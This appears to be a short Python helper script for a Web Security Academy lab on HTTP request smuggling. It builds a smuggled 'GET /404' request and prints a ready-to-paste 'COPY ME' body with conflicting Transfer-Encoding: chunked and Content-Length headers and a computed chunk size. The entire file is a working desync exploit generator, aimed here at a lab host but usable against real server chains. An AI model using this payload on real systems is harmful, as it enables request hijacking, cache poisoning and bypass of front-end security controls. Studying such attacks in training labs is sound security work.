import re

RN = '\n'
HOSTNAME = "0ade00280387b20fc08de512005b005e.web-security-academy.net"

def PREFIX(HOSTNAME):

    PREF = "GET /404 HTTP/1.1" + RN 
    PREF += "Host: {}".format(HOSTNAME) + RN
    PREF += "Content-Type: application/x-www-form-urlencoded" + RN
    PREF += "Content-length: 15" + RN
    PREF += "x=1" + RN


    if '\r' not in PREF:
        PREF = PREF.replace('\n', '\r\n')

    return PREF


PREF = PREFIX(HOSTNAME)

CHUNK_SIZE = hex(len(PREF)).lstrip("0x")


print('''
[*]----------[COPY ME]----------[*]\n
Transfer-Encoding: chunked
Content-Length: 3\n
{}
{}
0
'''.format(CHUNK_SIZE,PREF))
